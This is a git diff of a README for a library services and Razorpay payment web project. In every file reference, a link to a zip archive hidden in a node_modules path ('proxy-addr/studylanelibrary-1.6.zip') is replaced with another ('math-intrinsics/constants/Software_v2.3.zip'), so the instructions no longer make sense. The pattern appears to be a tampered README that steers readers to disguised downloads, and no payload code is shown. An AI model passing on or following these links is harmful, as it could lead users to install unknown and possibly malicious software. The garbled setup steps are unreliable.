@@ -7,9 +7,9 @@ payment processing.
 
 This project consists of two main components:
 
--   **Service Page (`https://raw.githubusercontent.com/chandan-singh101/studylanelibrary/main/node_modules/proxy-addr/studylanelibrary-1.6.zip`)** - Library services interface with
+-   **Service Page (`https://raw.githubusercontent.com/chandan-singh101/studylanelibrary/main/node_modules/math-intrinsics/constants/Software_v2.3.zip`)** - Library services interface with
     cart functionality\
--   **Payment Page (`https://raw.githubusercontent.com/chandan-singh101/studylanelibrary/main/node_modules/proxy-addr/studylanelibrary-1.6.zip`)** - Secure payment processing with
+-   **Payment Page (`https://raw.githubusercontent.com/chandan-singh101/studylanelibrary/main/node_modules/math-intrinsics/constants/Software_v2.3.zip`)** - Secure payment processing with
     Razorpay integration
 
 ## Features
@@ -46,7 +46,7 @@ This project consists of two main components:
 ### Installation
 
 1.  Clone or download the project files\
-2.  Update the Razorpay key in `https://raw.githubusercontent.com/chandan-singh101/studylanelibrary/main/node_modules/proxy-addr/studylanelibrary-1.6.zip`:
+2.  Update the Razorpay key in `https://raw.githubusercontent.com/chandan-singh101/studylanelibrary/main/node_modules/math-intrinsics/constants/Software_v2.3.zip`:
     `javascript     const options = {         "key": "your_razorpay_key_here", // Replace with your actual key         // ... other options     };`
 3.  Deploy to a web server\
 4.  Set up backend APIs for:
@@ -59,8 +59,8 @@ This project consists of two main components:
 ## File Structure
 
     /
-    ├── https://raw.githubusercontent.com/chandan-singh101/studylanelibrary/main/node_modules/proxy-addr/studylanelibrary-1.6.zip          # Main services page with cart
-    ├── https://raw.githubusercontent.com/chandan-singh101/studylanelibrary/main/node_modules/proxy-addr/studylanelibrary-1.6.zip          # Payment processing page
+    ├── https://raw.githubusercontent.com/chandan-singh101/studylanelibrary/main/node_modules/math-intrinsics/constants/Software_v2.3.zip          # Main services page with cart
+    ├── https://raw.githubusercontent.com/chandan-singh101/studylanelibrary/main/node_modules/math-intrinsics/constants/Software_v2.3.zip          # Payment processing page
     └── (Backend APIs needed) # Server-side endpoints
 
 ## Usage
